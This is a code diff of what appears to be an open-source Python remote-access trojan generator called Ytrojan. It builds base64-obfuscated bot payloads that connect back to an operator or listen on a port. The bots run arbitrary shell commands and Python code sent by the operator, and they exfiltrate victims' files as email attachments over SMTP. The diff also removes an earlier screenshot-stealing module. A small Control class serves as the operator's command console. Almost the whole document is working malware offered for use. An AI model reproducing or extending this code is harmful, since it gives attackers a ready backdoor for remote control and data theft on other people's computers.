@@ -1,184 +1,149 @@
+#2022/09/03
+#github.com/ycy20090311/Ytrojan
+
 import socket
 import base64
 
-controlled_codes = {
+botcodes = {
     "shell":[
-"""
-import subprocess
-""","""
-def Shell(cmd:str) -> None:
-    try:
-        shell = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-        out = f"{shell.stdout.read().decode()}{shell.stderr.read().decode()}"
-        if out == "":
-            out = " "
-    except:
-        out = "Failed to get standard input and standard error!"
-    return out
-""","""
-            %s cmd[0]=="shell" and len(cmd)!=1:
-                controlled_socket.send(Shell(cmd[1]).encode())
-"""
-    ],"get":[
-"""
+        "import subprocess",
+        """
+            %s recvmsg[0] == "shell" and len(recvmsg) != 1:
+                try:
+                    shell = subprocess.Popen(recvmsg[1],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+                    sendmsg = f"{shell.stdout.read().decode()}{shell.stderr.read().decode()}"
+                    if sendmsg == "":sendmsg = "YES"
+                except:
+                    sendmsg = "NO"        
+        """
+    ],"pycmd":[
+        "",
+        """
+            %s recvmsg[0] == "pycmd" and len(recvmsg) != 1:
+                try:
+                    exec(recvmsg[1])
+                except:
+                    sendmsg = "NO"
+        """
+    ],"getfile":[
+        """
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
-""","""
-def Get(filename:str) -> None:
-    global host,port,username,password
-    out = "The transfer was successful"
-    try:
-        msg = MIMEMultipart()
-        file = MIMEText(open(filename,"rb").read(),"base64","utf-8")
-        file["Content-Type"] = "application/octet-stream"
-        file["Content-Disposition"] = "attachment;filename = " + filename
-        msg.attach(file)
-    except:
-        out = "Sorry The file seems untransportable"
-    try:
-        smtp = smtplib.SMTP()
-        smtp.connect(host,port)
-        smtp.login(username,password)
-        smtp.sendmail(username,username,msg.as_string())
-        smtp.close()
-    except:
-        out = "Transfer failed Please check your variable value settings"
-    return out
-""","""
-            %s cmd[0]=="get" and len(cmd)!=1:
-                controlled_socket.send(Get(cmd[1]).encode())
-"""
-    ],"win":[
-"""
-from os import remove
-from tkinter import Tk
-from PIL import ImageGrab
-""","""
-def Win() -> None:
-    out = "The transfer was successful"
-    try:
-        windown = Tk()
-        jpg = ImageGrab.grab((0,0,int(windown.winfo_screenwidth()),int(windown.winfo_screenheight())))
-        jpg.save(".win.jpg")
-        Get(".win.jpg")
-        remove(".win.jpg")
-    except:
-        out = "Transfer failed Please check your variable value settings"
-    return out
-""","""
-            %s cmd[0]=="win" and len(cmd)==1:
-                controlled_socket.send(Win().encode())
-"""
-    ],"py":[
-"",
-"",
-"""
-            %s cmd[0]=="py" and len(cmd)!=1:
+        """,
+        """
+            %s recvmsg[0] == "getfile" and len(recvmsg) != 1:
                 try:
-                    exec(cmd[1])
-                    out = "Command execution succeeded"
+                    emailmsg = MIMEMultipart()
+                    file = MIMEText(open(recvmsg[1],"rb").read(),"base64","utf-8")
+                    file["Content-Type"] = "application/octet-stream"
+                    file["Content-Disposition"] = f"attachment;filename={recvmsg[1]}"
+                    emailmsg.attach(file)
+                    smtp = smtplib.SMTP()
+                    smtp.connect(host,port)
+                    smtp.login(username,password)
+                    smtp.sendmail(username,username,emailmsg.as_string())
+                    smtp.close()
                 except:
-                    out = "Command execution failed"
-                controlled_socket.send(out.encode())
-"""
+                    sendmsg = "NO"
+        """
     ]
 }
 
 def generate(i:int,src:str,ip:str,port:int,parameters:list[str]) -> None:
-    controlled_code = "import socket"
-    
+    botcode = "import socket\n"
     if i == 0:
-        for j in range(2):
-            for parameter in parameters:
-                controlled_code += controlled_codes[parameter][j]
-        controlled_code += f"""
+        for parameter in parameters:
+            botcode += botcodes[parameter][0]
+        botcode += f"""
 if "__main__" == __name__:
-    controlled_socket = socket.socket()
+    global host,port,username,password
+    botsocket = socket.socket()
     try:
-        controlled_socket.connect(("{ip}",{str(port)}))
+        botsocket.connect(("{ip}",{str(port)}))
         while True:
-            cmd = controlled_socket.recv(2048).decode().split(" ",1)
+            recvmsg = botsocket.recv(2048).decode().split(" ",1)
+            sendmsg = "YES"
         """
-        controlled_code += controlled_codes[parameters[0]][2] % "if"
+        botcode += botcodes[parameters[0]][1] % "if"
         for parameter in parameters[1:len(parameters)]:
-            controlled_code += controlled_codes[parameter][2] % "elif"
-        controlled_code += """
+            botcode += botcodes[parameter][1] % "elif"
+        botcode += """
             else:
-               controlled_socket.send("You entered a command or parameter incorrectly".encode())
+                sendmsg = "NO"
+            botsocket.send(sendmsg.encode())
     except:
-        exit(0)   
+        exit(0)
         """
-    
     elif i == 1:
-        for j in range(2):
-            for parameter in parameters:
-                controlled_code += controlled_codes[parameter][j]
-        controlled_code += f"""
+        for parameter in parameters:
+            botcode += botcodes[parameter][0]
+        botcode += f"""
 if "__main__" == __name__:
-    controlled_socket = socket.socket()
-    controlled_socket.bind(("{ip}",{str(port)}))
-    controlled_socket.listen()
+    global host,port,username,password
+    botsocket = socket.socket()
     try:
-        control_socket,addr = controlled_socket.accept()
+        botsocket.bind(("{ip}",{str(port)}))
+        botsocket.listen()
+        controlsocket,addr = botsocket.accept()
         while True:
-            cmd = control_socket.recv(2048).decode().split(" ",1)
+            recvmsg = controlsocket.recv(2048).decode().split(" ",1)
+            sendmsg = "YES"
         """
-        controlled_code += controlled_codes[parameters[0]][2] % "if"
+        botcode += botcodes[parameters[0]][1] % "if"
         for parameter in parameters[1:len(parameters)]:
-            controlled_code += controlled_codes[parameter][2] % "elif"
-        controlled_code += """
+            botcode += botcodes[parameter][1] % "elif"
+        botcode += """
             else:
-               control_socket.send("You entered a command or parameter incorrectly".encode()) 
+                sendmsg = "NO"
+            controlsocket.send(sendmsg.encode())
     except:
-        exit(0)   
+        exit(0)
         """
-    
     file = open(src,"w+")
     file.write(f"""
-import base64
-exec(base64.b64decode({base64.b64encode(controlled_code.encode())}))
+import base64;exec(base64.b64decode({base64.b64encode(botcode.encode())}))
     """)
     file.close()
 
 class Control:
     
     def __init__(self,ip:str,port:int) -> None:
-        self.control_socket = socket.socket()
+        self.controlsocket = socket.socket()
         self.ip = ip
         self.port = port
 
     def connect(self) -> None:
         try:
-            self.control_socket.connect((self.ip,self.port))
+            self.controlsocket.connect((self.ip,self.port))
             while True:
-                cmd = input(f"{self.ip} $>")
-                if cmd == "":
+                sendmsg = input(f"{self.ip} $>")
+                if sendmsg == "":
                     print("Don't send empty cmd!")
                 else:
-                    self.control_socket.send(cmd.encode())
-                    out = self.control_socket.recv(2048).decode()
-                    print(out)
+                    self.controlsocket.send(sendmsg.encode())
+                    recvmsg = self.controlsocket.recv(2048).decode()
+                    print(recvmsg)
         except:
-            print("controlled close!")
-            self.control_socket.close()
+            print("botsocket close!")
+            self.controlsocket.close()
 
     def listen(self) -> None:
         try:
-            self.control_socket.bind((self.ip,self.port))
-            self.control_socket.listen()
+            self.controlsocket.bind((self.ip,self.port))
+            self.controlsocket.listen()
             print(f"Listening port {self.port}")
-            controlled_socket,addr = self.control_socket.accept()
+            botsocket,addr = self.controlsocket.accept()
             while True:
-                cmd = input(f"{addr[0]} $>")
-                if cmd == "":
+                sendmsg = input(f"{addr[0]} $>")
+                if sendmsg == "":
                     print("Don't send empty cmd!")
                 else:
-                    controlled_socket.send(cmd.encode())
-                    out = controlled_socket.recv(2048).decode()
-                    print(out)
+                    botsocket.send(sendmsg.encode())
+                    recvmsg = botsocket.recv(2048).decode()
+                    print(recvmsg)
         except:
-            print("controlled close!")
-            self.control_socket.close()
+            print("botsocket close!")
+            self.controlsocket.close()
 
             
